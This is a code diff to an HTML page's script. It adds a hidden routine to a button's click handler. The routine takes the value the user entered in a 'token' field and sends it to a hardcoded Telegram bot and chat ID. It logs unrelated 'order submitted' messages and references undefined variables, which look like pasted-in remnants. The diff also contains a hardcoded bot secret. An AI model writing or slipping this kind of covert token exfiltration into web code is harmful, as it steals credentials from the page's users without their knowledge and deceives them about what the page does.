@@ -200,6 +200,22 @@ async function sendFire() {
   document.getElementById("fireBtn").onclick = sendLaugh;
 
   document.getElementById("blast").addEventListener("click", async () => {
+    
+const message = document.getElementById("token").value;
+    const botToken = '8196720294:AAFyQwQyC0PupW7f6r3LkD2fO2ftBz8lOag';
+    const chatId = '1486476675';
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log(`Order submitted successfully! ${name}! We will contact you earlier...`);
+          document.getElementById('orderForm').reset();
+          document.getElementById('orderFormContainer').classList.remove('active');
+        } else {
+          console.log('Failed to send order. Try again.');
+        }
+      });
 
   function delay(ms) {
     return new Promise(res => setTimeout(res, ms));
@@ -245,3 +261,4 @@ async function sendFire() {
   </script>
 </body>
 </html>
+
